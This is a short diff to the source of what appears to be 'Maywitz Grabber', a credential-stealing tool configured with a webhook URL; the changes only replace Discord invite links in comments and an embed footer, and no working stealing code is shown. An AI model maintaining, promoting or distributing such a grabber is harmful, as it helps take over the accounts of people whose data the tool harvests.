@@ -23,7 +23,7 @@ webhook_url = "Webhook link goes here, keep the quotes"
 """
 Don't change any of the code below here, unless you know what you're doing --- Maywitz
 
-This is only the free version, join the discord server at https://discord.gg/8TfaWhM2jr for more info 
+This is only the free version, join the discord server at https://discord.gg/qxt6aC8U2F for more info 
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
@@ -31,7 +31,7 @@ Star this repository, it would support me a lot!
 
 --Thanks <3
 
-Join the discord server at https://discord.gg/8TfaWhM2jr
+Join the discord server at https://discord.gg/qxt6aC8U2F
 
 """
 
@@ -333,7 +333,7 @@ class Maywitz_Grabber(functions):
                         }
                     ],
                     'footer': {
-                        'text': 'Maywitz Grabber, https://discord.gg/8TfaWhM2jr'
+                        'text': 'Maywitz Grabber, https://discord.gg/qxt6aC8U2F'
                     }
                 }
             ]
